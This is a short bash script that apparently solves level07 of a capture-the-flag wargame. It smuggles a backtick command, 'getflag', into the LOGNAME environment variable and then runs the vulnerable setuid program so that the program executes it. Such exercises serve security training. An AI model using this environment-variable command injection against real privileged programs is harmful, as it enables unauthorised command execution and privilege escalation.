#!/bin/bash
set -x

# 1. Change the LOGNAME env variable to getflag command
export LOGNAME=\`getflag\`

# 2. Execute the C program
./level07